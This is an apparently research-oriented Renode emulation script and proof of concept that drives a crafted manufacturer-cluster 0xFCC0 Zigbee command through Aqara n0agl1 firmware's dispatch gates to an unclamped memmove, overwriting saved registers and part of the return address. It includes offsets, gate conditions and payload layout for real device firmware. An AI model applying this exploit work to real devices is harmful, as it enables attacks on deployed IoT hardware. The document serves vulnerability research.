@@ -1,0 +1,200 @@
+:name: ZB-04 Aqara n0agl1 — ZCL-DISPATCH-INJECTION reachability PoC (0xFCC0 mfg-cluster gate -> constrained stack-OOB SINK) [Series 1 / EFR32MG13 / Cortex-M4]
+:description: Injects an ALREADY-DECRYPTED PLAINTEXT manufacturer-specific 0xFCC0 ZCL command (as a crafted EmberAfClusterCommand) at the firmware's mfg-cluster dispatch gate sub_B9DC and lets the real Aqara n0agl1 firmware's OWN code run the struct[0x15] path split, the clusterId classification switch, the clusterId==0xFCC0 comparison, and the mfg-command flag gate (*0x200059f4==1), TAIL-CALLING the vulnerable sink sub_5014. No PC is forced into the switch, the clusterId gate, the flag gate, or the sink: only the dispatch ENTRY sub_B9DC is entered with the register contract the RX/dispatch chain (sub_1E928 -> sub_1E524 -> sub_1D958 -> sub_B9DC) would set up. This closes two axes the function-level PoC (zb04_validate.resc, which forces PC=0x5014) skips: (1) GATE REACHABILITY (the firmware's own switch + clusterId==0xFCC0 + flag gate route the frame to sub_5014) and (2) PARAMETER FIDELITY (the attacker bufLen flows UNCLAMPED into the memmove count).
+#
+# ============================ RESULT (reproduced 2026-07-13, MG13/Cortex-M4) ============================
+#   Marker order (NATURAL branches/calls of the firmware, no forced PC below the entry):
+#       MARK_B9DC_ENTRY -> MARK_BA26_PATH2 -> MARK_BA3C_LOOKUP_OK -> MARK_BA82_CLUSTER_CMP
+#       -> MARK_BA8A_FCC0_MATCH -> MARK_BA94_FLAG_OK -> MARK_5014_SINK_ENTRY
+#       -> MARK_502A_MEMMOVE -> MARK_5042_POST_MEMMOVE
+#     MARK_BA14_REJECT_MAIN / MARK_BA0E_REJECT_DEFAULT did NOT fire.
+#   Constrained overflow, read at PC=0x5044 (one past the 0x5042 marker, after memmove, before epilogue):
+#       0x2000EFB0 (buffer)   = 0xAAAAAAAA   payload written
+#       0x2000EFF0 (saved R4) = 0xAAAAAAAA   fully overwritten
+#       0x2000EFF4 (saved R5) = 0xAAAAAAAA   fully overwritten
+#       0x2000EFF8 (saved R6) = 0xAAAAAAAA   fully overwritten
+#       0x2000EFFC (saved LR) = 0xDEADBEAA   ONLY low byte (0xEF->0xAA) corrupted (constrained)
+#   => The firmware's OWN mfg-cluster dispatch routed the injected 0xFCC0 frame through the
+#      clusterId==0xFCC0 gate and the *0x200059f4==1 flag gate to sub_5014, and the attacker
+#      bufLen (0x52) flowed UNCLAMPED into count=(uint16)(bufLen-5)=77, fully overwriting saved
+#      R4/R5/R6 and the low byte of the saved return address. Bounded by the 82-byte reception
+#      cap = constrained CFH/DoS (NOT full PC control), exactly as the report claims.
+#
+# ============================ FORCED vs NATURAL ============================
+#   FORCED (emulation scaffolding, minimal):
+#     * The plaintext EmberAfClusterCommand struct + APS/ZCL header stand-in + source buffer are
+#       written into scratch RAM and the CPU is entered at sub_B9DC (0xB9DC) with r0 = &cmd
+#       exactly as the dispatch chain would pass it. This deliberately BYPASSES NWK/APS
+#       decryption, APS addressing/endpoint routing, and the ZCL-header decode that builds `cmd`
+#       (models a joined device whose traffic has already been authenticated/decrypted).
+#     * The mfg-command flag *0x200059f4 is pre-seeded = 1. sub_63c8 returns the constant base
+#       0x200059d0 and sub_B9DC reads [base+0x24] = *0x200059f4; the gate at 0xba90 requires == 1.
+#       This one device-state cell is a normal runtime flag, not a gate on attacker data.
+#     * The endpoint/cluster-AFFINITY lookup sub_1bff6 is stubbed to `movs r0,#1; bx lr`.
+#       WHY (verified, honest): sub_1bff6 -> sub_1bf7c scans the endpoint table whose count byte
+#       *0x20003329 and base *0x200060f8 are BOTH 0x00000000 after a bare (non-joined) boot -- no
+#       endpoints/clusters are registered -- so the lookup returns 0 and sub_B9DC rejects at 0xba3a
+#       (branch to 0xba14). This is the SAME "endpoint/cluster affinity search ABOVE the command
+#       dispatch" that the ZB-05 PoC documents as bypassed scaffolding; here it happens to sit
+#       INSIDE sub_B9DC. The stub represents a device that HAS manufacturer cluster 0xFCC0
+#       registered on the target endpoint (the real Aqara n0agl1 does). It does NOT touch the
+#       attacker-controlled clusterId, the 0xFCC0 comparison, the flag gate, or any sink parameter.
+#       ---> Without the stub the natural path is IDENTICAL up to MARK_BA26_PATH2, then rejects at
+#            0xba3a (sub_1bff6 == 0) and returns to the caller. See "NATURAL-REJECT FINDING" below.
+#   NATURAL (firmware's own execution, from sub_B9DC down -- NO forced PC):
+#     * sub_B9DC reads cmd[0x15]; ==0 takes the "path 2" branch to 0xba26 (0xb9ee bne 0xba26).
+#     * 0xba26 re-checks cmd[0x15]==0, calls sub_1bff6(dir=hdr[5], clusterId=hdr[2], mfgCode=cmd[0x10]).
+#     * 0xba3c: reads clusterId = *(cmd[0] + 2) and runs the firmware's own clusterId switch;
+#       0xFCC0 falls through the >0xa / >0x702 / !=0xb04 comparisons to 0xba82.
+#     * 0xba82: movw r2,#0xFCC0 ; cmp clusterId,r2 ; 0xba88 bne 0xba14 (reject if != 0xFCC0).
+#     * 0xba8a: bl sub_63c8 (returns 0x200059d0) ; ldr r3,[r0,#0x24] = *0x200059f4 ;
+#       0xba90 cmp r3,#1 ; 0xba92 bne 0xba0e (reject if flag != 1).
+#     * 0xba94: mov r0,cmd ; pop {r3,r4,r5,lr} ; 0xba9a b.w sub_5014 (TAIL-CALL, SP preserved).
+#     * sub_5014: FIRST op is the unbounded copy. count=(uint16)(cmd[0xc]-cmd[0x14]) = 0x52-5 = 77;
+#       dest = SP+0x10 (64-byte buffer); src = cmd[0x8]+cmd[0x14]; BL sub_C5F0 (memmove) @0x502a.
+#       No clamp. push{r4,r5,r6,lr}+sub sp,#0x50 => saved R4/R5/R6 at buf[64/68/72], saved LR at
+#       buf[76]; count 77 writes buf[0..76], fully overwriting R4/R5/R6 and the LOW BYTE of saved LR.
+#
+# ============================ ARG CONTRACT AT sub_B9DC (r0 = &cmd = EmberAfClusterCommand) ==========
+#   cmd[0x00] = ptr to APS/ZCL header ; header[+2] (u16) = clusterId (gate: == 0xFCC0) ; header[+5] = dir
+#   cmd[0x08] = source base ptr (sink src = cmd[0x08] + cmd[0x14])
+#   cmd[0x0c] = bufLen (u16)  (sink count = (u16)(cmd[0x0c] - cmd[0x14]))
+#   cmd[0x0f] = mfg-specific flag byte (only affects default status value)
+#   cmd[0x10] = mfgCode (u16, -> sub_1bff6)      cmd[0x14] = payloadStartIndex byte (= 5)
+#   cmd[0x15] = path selector byte (gate: == 0 -> the mfg 0xFCC0 path)
+#
+# ============================ STACK / SENTINEL MATH ============================
+#   Entry SP (fresh) at sub_B9DC                 = 0x2000F000
+#   sub_B9DC push{r3,r4,r5,lr} then pop before   -> SP back to 0x2000F000 (tail-call, no net change)
+#   b.w sub_5014 -> sub_5014 push{r4,r5,r6,lr}    -> SP = 0x2000EFF0 ; sub sp,#0x50 -> SP = 0x2000EFA0
+#   buffer = SP+0x10                              = 0x2000EFB0
+#   saved R4 = 0x2000EFF0  saved R5 = 0x2000EFF4  saved R6 = 0x2000EFF8  saved LR = 0x2000EFFC
+#   buf[64]=0x2000EFF0(=R4) ... buf[76]=0x2000EFFC(=LR low byte). count 77 => reaches saved-LR low byte.
+#
+# ============================ NATURAL-REJECT FINDING (honest dead-end, then bypassed) ==============
+#   With sub_1bff6 NOT stubbed, a Step trace of the natural path is:
+#       0xB9DC -> 0xBA26 (path2) -> 0x1BFFA (sub_1bff6) -> 0x1BF82 (sub_1bf7c endpoint scan)
+#       -> returns 0 -> 0xba3a beq -> 0xba14 -> pop{...pc} -> LR sentinel 0xDEADBEEE (CPU abort).
+#   EXACT check: 0xba38 `cmp r0,#0` / 0xba3a `beq 0xba14`. Wanted: sub_1bff6 != 0, i.e. the endpoint
+#   table (count *0x20003329, base *0x200060f8 -- both 0 in a bare boot) must contain the target
+#   endpoint with mfg cluster 0xFCC0. Satisfied on a real joined device; here supplied via the stub.
+# =======================================================================================
+
+using sysbus
+emulation SetGlobalSerialExecution true
+mach create "zb04"
+machine LoadPlatformDescription @platforms/boards/silabs/brd4162a.repl
+macro reset
+"""
+    sysbus LoadELF @scripts/silabs-vuln/zb04_aqara.elf
+    cpu VectorTableOffset 0x4000
+"""
+runMacro $reset
+logLevel 3
+
+# COLD chain hooks (each executes once on this path -> no flooding).
+cpu AddHook 0xb9dc "self.ErrorLog('MARK_B9DC_ENTRY')"
+cpu AddHook 0xba26 "self.ErrorLog('MARK_BA26_PATH2')"
+cpu AddHook 0xba3c "self.ErrorLog('MARK_BA3C_LOOKUP_OK')"
+cpu AddHook 0xba82 "self.ErrorLog('MARK_BA82_CLUSTER_CMP')"
+cpu AddHook 0xba8a "self.ErrorLog('MARK_BA8A_FCC0_MATCH')"
+cpu AddHook 0xba94 "self.ErrorLog('MARK_BA94_FLAG_OK')"
+cpu AddHook 0x5014 "self.ErrorLog('MARK_5014_SINK_ENTRY')"
+cpu AddHook 0x502a "self.ErrorLog('MARK_502A_MEMMOVE')"
+# reject-sentinel hooks (prove the gate PASSED naturally, not bypassed)
+cpu AddHook 0xba14 "self.ErrorLog('MARK_BA14_REJECT_MAIN')"
+cpu AddHook 0xba0e "self.ErrorLog('MARK_BA0E_REJECT_DEFAULT')"
+# post-memmove observation point (marker only; we stop here via an exact Step count, because
+# IsHalted set inside a hook is NOT honored mid-Step on this MG13 image, and running past this
+# point lets the downstream 0xFCC0 handler sub_4cc8 re-copy and CLOBBER the sentinel slots).
+cpu AddHook 0x5042 "self.ErrorLog('MARK_5042_POST_MEMMOVE')"
+
+# Boot through clock/power/radio bring-up.
+emulation RunFor "0.3"
+pause
+echo ">>> post-boot PC (expect advanced past reset vector):"
+cpu PC
+
+# --- FORCED: mfg-command flag gate (*0x200059f4 == 1, read via sub_63c8()[0x24]) ------
+sysbus WriteDoubleWord 0x200059f4 0x00000001
+
+# --- FORCED: stub the endpoint/cluster-affinity lookup sub_1bff6 -> `movs r0,#1; bx lr`
+#     (no endpoints registered in a bare boot: *0x20003329==0; models a joined device that
+#      implements mfg cluster 0xFCC0 -- see NATURAL-REJECT FINDING in the header).
+sysbus WriteWord 0x1bff6 0x2001
+sysbus WriteWord 0x1bff8 0x4770
+
+# --- Crafted EmberAfClusterCommand `cmd` @0x2000A000 (r0 at sub_B9DC) -----------------
+#   [0x00]=header ptr 0x2000A100  [0x08]=source base 0x2000B000  [0x0c]=bufLen 0x0052 (82)
+#   [0x0f]=mfg flag 0  [0x10]=mfgCode 0x115F  [0x14]=payloadStartIndex 5  [0x15]=path selector 0
+sysbus WriteDoubleWord 0x2000A000 0x2000A100
+sysbus WriteDoubleWord 0x2000A008 0x2000B000
+sysbus WriteDoubleWord 0x2000A00C 0x00000052
+sysbus WriteDoubleWord 0x2000A010 0x0000115F
+sysbus WriteByte 0x2000A014 0x05
+sysbus WriteByte 0x2000A015 0x00
+sysbus WriteByte 0x2000A00F 0x00
+
+# --- APS/ZCL header stand-in @0x2000A100: [+2] (u16)=clusterId 0xFCC0  [+5]=direction 1 -----
+sysbus WriteDoubleWord 0x2000A100 0xFCC00000
+sysbus WriteByte 0x2000A105 0x01
+
+# --- Source buffer: memmove reads 77 bytes from 0x2000B005. Fill 0xAA sentinel. -----------
+sysbus WriteDoubleWord 0x2000B000 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B004 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B008 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B00C 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B010 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B014 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B018 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B01C 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B020 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B024 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B028 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B02C 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B030 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B034 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B038 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B03C 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B040 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B044 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B048 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B04C 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B050 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B054 0xAAAAAAAA
+
+# --- Register contract the dispatch chain hands sub_B9DC ------------------------------
+#   r0 = &cmd    SP = fresh scratch stack    LR = 0xDEADBEEF sentinel (saved-LR fill)
+sysbus.cpu SetRegister 13 0x2000F000
+sysbus.cpu SetRegister 14 0xDEADBEEF
+sysbus.cpu SetRegister 0  0x2000A000
+sysbus.cpu PC 0xB9DC
+
+echo ">>> BEFORE: saved R4/R5/R6/LR slots (0x2000EFF0/F4/F8/FC) ="
+sysbus ReadDoubleWord 0x2000EFF0
+sysbus ReadDoubleWord 0x2000EFF4
+sysbus ReadDoubleWord 0x2000EFF8
+sysbus ReadDoubleWord 0x2000EFFC
+
+# Let the firmware's OWN dispatch carry the frame down. We drive it with Step (RunFor stalls
+# on this MG13 image); the marker hooks fire during Step. Step count 345 lands EXACTLY at the
+# post-memmove observation PC 0x5042 (0xB9DC entry -> b.w sub_5014 at step 45, +300 to 0x5042,
+# same +300 the function-level recipe uses). MG13 MappedMemory writes bypass Renode watchpoints,
+# so we OBSERVE by READING memory here (before the downstream handler can clobber the frame).
+sysbus.cpu Step 346
+echo ">>> observation PC (expect 0x5044 = one past the 0x5042 post-memmove marker):"
+cpu PC
+
+echo ">>> AFTER: PC ="
+cpu PC
+echo ">>> AFTER: buffer start @0x2000EFB0 (expect 0xAAAAAAAA) ="
+sysbus ReadDoubleWord 0x2000EFB0
+echo ">>> saved R4 @0x2000EFF0 (expect 0xAAAAAAAA) ="
+sysbus ReadDoubleWord 0x2000EFF0
+echo ">>> saved R5 @0x2000EFF4 (expect 0xAAAAAAAA) ="
+sysbus ReadDoubleWord 0x2000EFF4
+echo ">>> saved R6 @0x2000EFF8 (expect 0xAAAAAAAA) ="
+sysbus ReadDoubleWord 0x2000EFF8
+echo ">>> saved LR @0x2000EFFC (expect 0xDEADBEAA - one byte corrupted) ="
+sysbus ReadDoubleWord 0x2000EFFC
+echo ">>> (markers above: B9DC -> BA26 -> BA3C -> BA82 -> BA8A -> BA94 -> 5014 -> 502A -> 5042 = natural dispatch)"
+quit
